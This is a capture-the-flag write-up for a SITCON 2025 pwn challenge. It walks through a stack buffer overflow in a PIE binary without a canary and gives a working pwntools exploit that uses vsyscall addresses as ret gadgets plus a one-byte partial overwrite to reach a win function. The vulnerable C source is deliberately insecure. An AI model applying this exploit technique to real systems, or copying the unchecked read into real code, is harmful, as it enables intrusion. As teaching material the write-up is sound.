# CRYCHIC never died ... 🌸☀️📷
> Author: 堇姬 Naup

## solve
It has buffer overflow and win function.
```c
#include <stdlib.h>
#include <stdio.h>

// gcc chal.c -o chal -fno-stack-protector

void win() {
    puts("Forever ...");
    FILE *fp = fopen("/home/chal/flag.txt", "r");   
    if (fp == NULL) {
        perror("Error opening file");
        return 1;
    }

    char buffer[1024];  
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        printf("%s", buffer);  
    }

    fclose(fp);
}

int main() {
    char buf[0x30];
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    puts("CRYCHIC Never Died !!!!! Go to watch this video https://youtu.be/NJ1tne9u8YM?si=oH2lj2lmY5QXO5HD !");
    read(0, buf, 0x100);
}
```

But it open all protection, except for stack canary.
```
pwndbg> checksec
File:     /home/naup/Desktop/SITCON-2025-Challenge/CRICHIC_never_died/server/share/chal
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

If we don't know PIEbase, still can't jump to the win function.
We can observer stack (when it will execute `ret`.).
It look like this.

```
00:0000│ rsp 0x7fffffffddf8 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128) ◂— mov edi, eax
01:0008│     0x7fffffffde00 ◂— 0
02:0010│     0x7fffffffde08 —▸ 0x5555555552c5 (main) ◂— endbr64 
```

If we can overwrite `rsp+0x10` low one byte to win address and control rip to this part, we can get flag.
But how to let RIP change to this part.

vsyscall is a good way.
The address of vsyscall remains the same every time, and vsyscall have this gadget
```
0xffffffffff600000:  mov rax,0x60
0xffffffffff600007:  syscall
0xffffffffff600009:  ret
```

we can over write stack like this
0xffffffffff600000 can look it like `ret` 
```
00:0000│ rsp 0x7fffffffddf8 —▸ 0xffffffffff600000 
01:0008│     0x7fffffffde00 ◂— 0xffffffffff600000
02:0010│     0x7fffffffde08 —▸ 0x55555555522e (win+5) ◂— mov rbp, rsp
```

So now we can jump to win function and get flag!

## exploit
```python
from pwn import *

r = process("./chal")
#r=remote("192.168.5.131", 41000)

payload = b"A" * 0x38 + p64(0xffffffffff600000) + p64(0xffffffffff600000) + b"\x2e"
r.send(payload)

r.interactive()
```










